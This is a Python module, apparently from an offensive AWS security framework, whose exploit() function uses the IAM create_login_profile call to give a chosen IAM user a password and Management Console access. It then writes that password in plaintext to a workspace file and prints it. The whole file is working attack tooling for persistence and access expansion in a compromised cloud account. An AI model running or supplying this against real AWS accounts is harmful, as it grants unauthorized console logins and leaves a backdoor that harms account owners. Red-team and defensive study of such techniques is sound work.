from termcolor import colored
from datetime import datetime
import json

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "iam",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "USERNAME": {
        "value": "",
        "required": "true",
        "description": "The user to allow access to the Management Console."
    },
    "PASSWORD": {
        "value": "",
        "required": "true",
        "description": "The password to give to the user. The password needs to be compatible with the password policy configured. Use enum/aws_iam_get_account_password_policy to check it."
    },
    "PASSWORD-RESET-NEEDED": {
        "value": "false",
        "required": "false",
        "description": "If you want to, and I don't know why, you can make the account needing to reset the password at login."
    }
}
description = "If an IAM user is not allowed to access the Management Console, you can allow it using a password you want."

aws_command = "aws iam create-login-profile --user-name <user> --password <password> <--password-reset-required OR --no-password-reset-required> --region <region> --profile <profile>"


def exploit(profile, workspace):
    username = variables['USERNAME']['value']
    password = variables['PASSWORD']['value']

    if variables['PASSWORD-RESET-NEEDED']['value'] == 'true':
        pass_reset = True
    else:
        pass_reset = False

    try:
        now = datetime.now()
        dt_string = now.strftime("%d_%m_%Y_%H_%M_%S")
        file = "{}_iam_create_user_login_profile".format(dt_string)
        filename = "./workspaces/{}/{}".format(workspace, file)

        response = profile.create_login_profile(
            UserName=username,
            Password=password,
            PasswordResetRequired=pass_reset
        )

        json_data = response
        json_data = response['LoginProfile']
        json_data['Password'] = password
        # json_data['LoginProfile']['Password'] = password

        with open(filename, 'w') as outfile:
            json.dump(json_data, outfile, indent=4, default=str)
            print(colored("[*] Content dumped on file '{}'.".format(filename), "green"))

        print("{}".format(colored("----------------------------------------", "red")))
        print("{}: {}".format(colored("Username", "yellow", attrs=['bold']), colored(json_data['UserName'], "white")))
        print("{}".format(colored("----------------------------------------", "red")))
        for key, value in json_data.items():
            print("\t{}: {}".format(colored(key, "red"), colored(value, "blue")))

    except profile.exceptions.EntityAlreadyExistsException:
        print(colored("[*] This user allready can login to the Management Console.", "red"))

    except profile.exceptions.NoSuchEntityException:
        print(colored("[*] This user does not exist.", "red"))

    except profile.exceptions.PasswordPolicyViolationException:
        print(colored("[*] The password does not comply with the password policy.", "red"))

    except profile.exceptions.LimitExceededException:
        print()
